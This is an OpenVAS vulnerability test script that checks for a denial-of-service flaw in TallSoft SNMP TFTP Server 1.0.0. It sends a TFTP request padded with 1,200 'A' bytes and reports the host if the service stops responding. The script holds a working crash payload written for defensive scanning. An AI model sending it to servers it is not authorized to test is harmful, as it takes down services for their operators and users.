###############################################################################
# OpenVAS Vulnerability Test
#
# TallSoft SNMP TFTP Server Denial Of Service Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806694");
  script_version("2020-11-10T09:46:51+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)");
  script_tag(name:"creation_date", value:"2016-04-01 13:19:27 +0530 (Fri, 01 Apr 2016)");
  script_name("TallSoft SNMP TFTP Server Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39627");

  script_tag(name:"summary", value:"This host is running TallSoft SNMP TFTP
  Server and is prone to denial of service vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted tftp request and check whether
  it is able to crash the application or not.");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of
  a long message request.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to cause denial of service attacks.");

  script_tag(name:"affected", value:"TallSoft SNMP TFTP Server 1.0.0.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_alive(port:port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

attack = raw_string(0x00, 0x01, 0x00) + raw_string(crap(data:raw_string(0x41),
                    length: 1200)) + raw_string(0x00);
send(socket:soc, data:attack);

close(soc);

if(!tftp_alive(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
